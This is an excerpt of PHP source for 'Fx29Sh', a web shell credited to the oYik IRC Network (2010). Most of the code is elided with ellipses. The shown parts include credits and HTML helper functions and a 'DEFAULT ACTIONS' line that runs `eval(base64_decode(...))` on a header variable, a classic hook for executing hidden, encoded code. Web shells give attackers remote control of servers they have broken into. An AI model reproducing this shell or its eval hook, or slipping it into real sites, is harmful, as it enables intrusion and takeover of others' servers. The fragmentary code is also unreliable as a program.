<?php
#######################################
##[ oYik IRC Network Fx29Sh 2.12.08 ]##
##[ By oYik IRC Network             ]##
##[ © 27-11 2010 oYik IRC Community ]##
...
##[ DEFAULT ACTIONS ]##
  ...
  header("Pragma: no-cache"); $headerz = ""; eval(base64_decode($headerz));
...
function fx29sh_about() {
  echo "<div class=\"barheader\">.: Credits :.</div>".
       ...
       "Re-coder, Designer, Windows Fix, PHP Mailer & PHP Filesystem: <b> oYik </b><br>".
       "<br>".
       "Please report bugs to <a href=\"mailto:oYik.crew@yahoo.com\">FaTaLisTiCz_Fx</a></b>\n";
}
function html_style() {
$style = '<html>
<head>
...
function html_header() { return "<b>".sh_name()."</b><br>.: oYik IRC Network :."; }
function html_footer() { return "&copy; 2010 By ipank. Generated: ".round(getmicrotime()-starttime,4)." seconds"; }
